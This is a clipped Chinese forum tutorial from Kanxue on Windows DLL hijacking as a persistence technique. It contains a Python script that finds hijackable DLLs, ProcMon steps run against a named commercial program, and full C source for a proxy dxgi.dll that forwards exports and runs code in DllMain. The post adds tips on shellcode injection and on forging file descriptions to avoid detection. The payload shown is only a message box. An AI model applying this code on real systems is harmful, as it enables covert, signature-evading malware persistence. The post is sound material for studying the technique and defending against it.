---
title: 【看雪】DLL劫持
source: https://bbs.kanxue.com/thread-291812.htm
source_host: bbs.kanxue.com
clip_date: 2026-06-29T16:34:28+08:00
trace_id: ad4c7bc4-8814-41da-b5e2-fa9e33211d2c
content_hash: df212d65855d5de42ad6067ee9a6c378b21d75420e92f0ba953b7c1729367e0f
status: summarized
tags:
  - 看雪
series: null
feed_source: 看雪·逆向工程
ai_summary: |-
  DLL劫持利用Windows加载DLL时先搜索程序所在目录的缺陷，通过放置同名恶意DLL实现隐蔽持久化，且能绕过数字签名校验。
  - **搜索顺序与原理：** Windows安全DLL搜索模式下，程序优先在exe所在目录查找依赖DLL。攻击者放置同名恶意DLL即可拦截加载；若原DLL在`system32`有备份，可通过函数转发（DLL代理）实现隐蔽劫持，不影响程序运行。
  - **可劫持目标筛选：** 静态链接的DLL无法劫持。隐式链接（导入表）DLL可通过脚本分析导入表，排除受内核保护的`KnowDLLs`后筛选；显式链接（`LoadLibrary`调用）DLL则需使用Process Monitor等工具监控程序运行时加载的DLL，寻找在程序目录缺失但`system32`中存在的DLL。
  - **劫持实现（有原版DLL）：** 以`dxgi.dll`为例，首先用`dumpbin /exports`获取原DLL的所有导出函数。然后编写恶意DLL，使用`#pragma comment(linker, "/EXPORT:函数名=系统路径\\原DLL.函数名")`指令将所有导出函数转发至原版DLL，仅在`DllMain`中加入恶意代码。
  - **私有DLL劫持：** 若目标DLL在`system32`中无原版（私有DLL），可将其重命名（如改为`original.dll.bak`），再创建同名恶意DLL。通过自动化脚本（如解析`dumpbin`输出）生成转发声明，将原函数转发至重命名后的DLL文件，实现劫持。
ai_summary_style: key-points
images_status:
  total: 6
  succeeded: 6
  failed_urls: []
notion_page_id: 38e75244-d011-8172-a179-f6dbf0e5f2fc
ioc:
  cves: []
  cwes: []
  hashes: []
  domains:
    - bbs.kanxue.com
    - cdn.jsdelivr.net
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> DLL劫持利用Windows加载DLL时先搜索程序所在目录的缺陷，通过放置同名恶意DLL实现隐蔽持久化，且能绕过数字签名校验。
> - **搜索顺序与原理：** Windows安全DLL搜索模式下，程序优先在exe所在目录查找依赖DLL。攻击者放置同名恶意DLL即可拦截加载；若原DLL在`system32`有备份，可通过函数转发（DLL代理）实现隐蔽劫持，不影响程序运行。
> - **可劫持目标筛选：** 静态链接的DLL无法劫持。隐式链接（导入表）DLL可通过脚本分析导入表，排除受内核保护的`KnowDLLs`后筛选；显式链接（`LoadLibrary`调用）DLL则需使用Process Monitor等工具监控程序运行时加载的DLL，寻找在程序目录缺失但`system32`中存在的DLL。
> - **劫持实现（有原版DLL）：** 以`dxgi.dll`为例，首先用`dumpbin /exports`获取原DLL的所有导出函数。然后编写恶意DLL，使用`#pragma comment(linker, "/EXPORT:函数名=系统路径\\原DLL.函数名")`指令将所有导出函数转发至原版DLL，仅在`DllMain`中加入恶意代码。
> - **私有DLL劫持：** 若目标DLL在`system32`中无原版（私有DLL），可将其重命名（如改为`original.dll.bak`），再创建同名恶意DLL。通过自动化脚本（如解析`dumpbin`输出）生成转发声明，将原函数转发至重命名后的DLL文件，实现劫持。

dll劫持是Windows平台上的一种经典的持久化技术，利用的是系统加载动态链接库（dll）时 **搜索顺序的缺陷** ，我们将恶意dll放在目标程序会 **优先查找** 的路径下，让程序"自愿加载"并执行dll

> 在 **安全dll搜索模式** 下，搜索顺序是

当某个程序的dll被成功劫持，那么每次在这个程序启动的时候，恶意dll都会被执行，而且进程的 **数字签名** 是有效合规的，难以被查杀

### dll劫持原理：dll的搜索顺序

自Windows XP SP2后，Windows都默认启用 **安全dll搜索模式** ，无论是静态连接还是动态链接的dll都会按一定顺序去查找

> 需要注意的是， **传统的dll劫持** 无法劫持 `KnowDLLs` 中的dll，首先是其具有 **内核保护机制** ，其次其加载优先级最高

当程序加载某个dll时，若该dll在exe目录中存在同名文件，则会优先加载该路径下的 DLL，而不会继续使用系统目录中的原始dll。攻击者可在程序目录放置 **同名恶意dll** ，从而实现加载拦截

在需要 **保持程序正常功能** 的情况下，可以通过dll proxying（dll代理）技术，将原dll的导出函数 **转发** 至系统目录中的真实dll，实现隐蔽劫持而不影响程序运行

> 如果所劫持的dll其实 **根本不会用到** ，不会影响可执行文件的正常工作，就不需要对其导出表进行转发

### 可劫持dll的寻找

学过Windows开发的小伙伴都知道，dll的加载模式分为 **静态链接** 与 **动态链接** ，静态连接（静态`.lib` ）不参与dll加载，因此没有办法被劫持。所以我们目标就要放在动态链接上。而动态链接又分为 **隐式动态链接** 和 **显示动态链接**

隐式动态链接（也叫 **加载时动态链接** ），是 **PE Loader** 解析PE文件 **导入表** 时，需要在进程启动时就要查找、链接  
显示动态链接（也叫 **运行时动态链接** ），是在代码执行过程中，在执行到 `LoadLibrary/ LoadLibraryEx` 时才去查找、加载

#### 隐式链接的可劫持dll

由之前的说明可以知道，受内核保护的dll是无法被劫持的，所以不管是筛选导入表中的dll还是运行时加载的dll，都要排除

```python
import pefile, winreg, sys, os

def known():
    k = winreg.OpenKey(
        winreg.HKEY_LOCAL_MACHINE,
        r"SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs"
    )
    i, s = 0, set()
    while 1:
        try:
            s.add(winreg.EnumValue(k, i)[1].lower())
            i += 1
        except OSError:
            break
    return s

def imports(p):
    pe = pefile.PE(p)
    return {i.dll.decode().lower() for i in getattr(pe, "DIRECTORY_ENTRY_IMPORT", [])}

if __name__ == "__main__":
    exe = sys.argv[1]
    system32 = os.path.join(os.environ["SystemRoot"], "System32")

    # 所有隐式链接的 DLL
    all_imports = imports(exe)

    # 受保护不可劫持
    protected = known()

    # 可劫持 = 导入 - 受保护
    hijackable = all_imports - protected

    # 分类：有系统原版（可代理） vs 无系统原版（私有/幽灵）
    with_system = {d for d in hijackable if os.path.exists(os.path.join(system32, d))}
    without_system = hijackable - with_system

    print("=== 可代理劫持（System32有同名原版）===")
    print(len(with_system), "\n" + "\n".join(sorted(with_system)))
    print("\n=== 需进一步分析的私有DLL（System32无原版）===")
    print(len(without_system), "\n" + "\n".join(sorted(without_system)))
```

我们通过脚本来搜索目标程序的导出表，并且筛选。在先前已经说过，在 **可执行文件所在的目录** 没有搜索到它需要加载的dll，就会按顺序往下搜索，下一位是 `system32` ，我们需要做的就是在 **可执行文件所在目录** 放入 **同名恶意dll** ，系统就会按名字优先加载恶意dll

有一个关键点，有些dll其实是根本不会被用上，比如一些废弃的dll，即使原程序加载失败也不会影响程序正常运行（ **幽灵劫持** ）。但是，其实绝大多数dll都是携带了目标程序 **所必要的函数** ，如果我们劫持了dll换成恶意代码，那程序很有可能就会因为 **有函数无法导入而崩溃** ，所以除了极少数程序完全容忍的 **纯可选dll** ，劫持时都必须做函数转发，否则要么进程起不来，要么中途崩溃

我将使用 **联想文件管家** 作为目标而 **测试脚本** ，可以看见是一个很人性化的脚本

> 私有dll的转发后续也会进行演示

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/06/4d6b1d621874d9f7.webp)

#### 显式链接的可劫持dll

显式链接的dll，我们一般使用 `ProcMon` 来进行侦察-> [Process Monitor](https://bbs.kanxue.com/elink@cd0K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6D9k6h3q4J5L8W2\)9J5k6h3#2A6j5%4u0G2M7$3!0X3N6q4\)9J5k6h3y4G2L8g2\)9J5c8X3g2F1i4K6u0V1N6i4y4Q4x3V1k6K6P5i4y4A6L8Y4c8W2M7X3&6S2L8s2y4Q4x3V1k6V1L8%4N6F1L8r3!0S2k6s2y4Q4x3V1k6H3M7X3!0U0L8h3!0F1)

对于显式链接的dll，名字是代码中的 **字符串** ，例如（ `LoadLibrary('hello.dll')` ），不在PE结构的导入表中，在 **静态分析导入表** 无法观察到，当程序运行到这行代码时才会出发搜索、加载（ **运行时动态链接** ）

我们先设置 **过滤器**

-   `Process Name` `is` `LeFile.exe` （你的目标进程，如何获取不必多说）
-   `Path` `end` `with` `.dll` （限制为dll文件）
-   `Result` `is` `NAME NOT FOUND` （缺失的dll）
-   `Result` `is` `SUCCESS` （对比分析后续是否会加载成功，用于分析dll代理，不加也没事）  
    

> 我眼睛看不过来就不设置最后一条了（苦笑

接着直接启动目标应用，主要观察该 **应用所在目录的dll** ，我一眼就相中了这个，后面我去看了不在之前脚本跑出来的列表里面也不在受保护的名单中

> 多看看就行，想一下子找到也不太可能

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/06/5116deb6d464be95.webp)

为了验证是否这个dll在 `system32` 中是否拥有，我们修改过滤条件

结果显而易见，虽然exe所在目录没搜到，但在 `system32` 中搜到了!  
这就是一个很好的实验样本

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/06/bbcbcdf8e59da563.webp)

### 实现dll劫持

这次我就直接针对显示连接的dll进行劫持，其实对于在 `system32` 有原版的dll都是如法炮制

#### 获取目标dll的导出表

> 什么是导出表？这个不会就先熟悉一下PE结构

在Windows下可以使用 **Visual Studio** 的终端

```
dumpbin /exports C:\Windows\System32\dxgi.dll
```

这一大串就是这个dll所提供的函数

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/06/b31f216c8977a569.webp)

#### 转发dll

我这里讲解使用 **连接器** （ `#prama` ）转发，其他方法还有 **动态转发** 、**`.def` 文件转发**

```c
#pragma comment(linker, "/EXPORT:CreateDXGIFactory=C:\\Windows\\System32\\dxgi.CreateDXGIFactory")
```

这段代码含义是，在这个.dll生成时将 `/EXPORT:`后面的函数导出为转发到 `System32\dxgi.dll` 中的 **同名函数** ，由此看来我们需要生成和原来导出函数一样多的 **转发预处理指令**

> 可以考虑借助工具生成

#### 实现的源码

也不必多言，就是转发所有的原dll导出的函数，最后就是正常的 `DllMain`

```c
#include <windows.h>

// 注意：64位程序必须转发到 System32，不是 SysWOW64！
#pragma comment(linker, "/EXPORT:ApplyCompatResolutionQuirking=C:\\Windows\\System32\\dxgi.ApplyCompatResolutionQuirking")
#pragma comment(linker, "/EXPORT:CompatString=C:\\Windows\\System32\\dxgi.CompatString")
#pragma comment(linker, "/EXPORT:CompatValue=C:\\Windows\\System32\\dxgi.CompatValue")
#pragma comment(linker, "/EXPORT:CreateDXGIFactory=C:\\Windows\\System32\\dxgi.CreateDXGIFactory")
#pragma comment(linker, "/EXPORT:CreateDXGIFactory1=C:\\Windows\\System32\\dxgi.CreateDXGIFactory1")
#pragma comment(linker, "/EXPORT:CreateDXGIFactory2=C:\\Windows\\System32\\dxgi.CreateDXGIFactory2")
#pragma comment(linker, "/EXPORT:DXGID3D10CreateDevice=C:\\Windows\\System32\\dxgi.DXGID3D10CreateDevice")
#pragma comment(linker, "/EXPORT:DXGID3D10CreateLayeredDevice=C:\\Windows\\System32\\dxgi.DXGID3D10CreateLayeredDevice")
#pragma comment(linker, "/EXPORT:DXGID3D10GetLayeredDeviceSize=C:\\Windows\\System32\\dxgi.DXGID3D10GetLayeredDeviceSize")
#pragma comment(linker, "/EXPORT:DXGID3D10RegisterLayers=C:\\Windows\\System32\\dxgi.DXGID3D10RegisterLayers")
#pragma comment(linker, "/EXPORT:DXGIDeclareAdapterRemovalSupport=C:\\Windows\\System32\\dxgi.DXGIDeclareAdapterRemovalSupport")
#pragma comment(linker, "/EXPORT:DXGIDisableVBlankVirtualization=C:\\Windows\\System32\\dxgi.DXGIDisableVBlankVirtualization")
#pragma comment(linker, "/EXPORT:DXGIDumpJournal=C:\\Windows\\System32\\dxgi.DXGIDumpJournal")
#pragma comment(linker, "/EXPORT:DXGIGetDebugInterface1=C:\\Windows\\System32\\dxgi.DXGIGetDebugInterface1")
#pragma comment(linker, "/EXPORT:DXGIReportAdapterConfiguration=C:\\Windows\\System32\\dxgi.DXGIReportAdapterConfiguration")
#pragma comment(linker, "/EXPORT:PIXBeginCapture=C:\\Windows\\System32\\dxgi.PIXBeginCapture")
#pragma comment(linker, "/EXPORT:PIXEndCapture=C:\\Windows\\System32\\dxgi.PIXEndCapture")
#pragma comment(linker, "/EXPORT:PIXGetCaptureState=C:\\Windows\\System32\\dxgi.PIXGetCaptureState")
#pragma comment(linker, "/EXPORT:SetAppCompatStringPointer=C:\\Windows\\System32\\dxgi.SetAppCompatStringPointer")
#pragma comment(linker, "/EXPORT:UpdateHMDEmulationStatus=C:\\Windows\\System32\\dxgi.UpdateHMDEmulationStatus")

//
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH)
    {
        MessageBoxA(NULL, "注入成功！", "提示", MB_OK | MB_ICONINFORMATION);
    }
    // 进阶：在此创建线程执行反射注入或Shellcode
    return TRUE;
}
```

#### 安置dll并运行

最后编译生成后放到 **目标exe所在的文件目录**

!\[\[dll劫持-7.png\]\]

运行目标程序，注入框先于原程序出来（这是正常的），dll先于 `WinMain` 加载，并且弹框会 **阻塞线程** ，把弹框点掉原程序就正常出来了

在 `ProcExp` 可以观察到两个不同路径的`.dll` ，一个有描述一个没有描述（我们的恶意同名dll）

为了让恶意dll，可以伪造描述等字段，这样就看不出来了

![图片描述](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/06/8854069bcfaf2544.webp)

至此就已经完成了 **整个dll劫持过程**

### 私有dll的转发

在之前有提过，对于程序私有dll，无法在 `system32` 找到原版，我们可以对其 **重命名为有后缀版本** ，再添加一个与原版同名的恶意dll，并将 **函数转发到重命名后的dll**

但是我们通过获取导入表，有五千多个函数，吓哭了

编写一个自动化脚本即可，批处理这些导出函数然后写入一个`.h` 文件作为dll的头文件进行一起编译

```python
import subprocess, sys, re  
  
def parse_exports(dll):  
    cmd = f'"D:\\soft\\vs\\VC\\Tools\\MSVC\\14.41.34120\\bin\\Hostx64\\x64\\dumpbin.exe" /exports "{dll}"'  
    out = subprocess.run(cmd, capture_output=True, text=True, shell=True).stdout  
    return re.findall(r'^\s+\d+\s+[0-9A-F]+\s+[0-9A-F]+\s+(\S+)', out, re.MULTILINE)  
  
  
if __name__ == "__main__":  
    dll, target = sys.argv[1], sys.argv[2]  # target 不带 .dll 后缀，例如 o    funcs = parse_exports(dll)  
    if not funcs:  
        sys.exit("导出解析失败")  
  
    lines = []  
    for f in funcs:  
        lines.append(f'#pragma comment(linker, "/EXPORT:{f}={target}.{f}")')  
  
    with open("exports.h", "w", encoding="utf-8") as f:  
        f.write("// 自动生成的转发声明，共 {} 条\n".format(len(funcs)))  
        f.write("\n".join(lines))  
    print(f"生成 exports.h，包含 {len(funcs)} 个转发条目。")
```

生成头文件`.h` ，我们把这个添入VS项目中

在其最开始进行导入

```c
#include <windows.h>
#include "exports.h"

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        MessageBoxA(NULL, "私有DLL劫持成功！", "提示", MB_OK | MB_ICONINFORMATION);
    }
    return TRUE;
}
```

编译之后放到目标exe所在目录运行即可
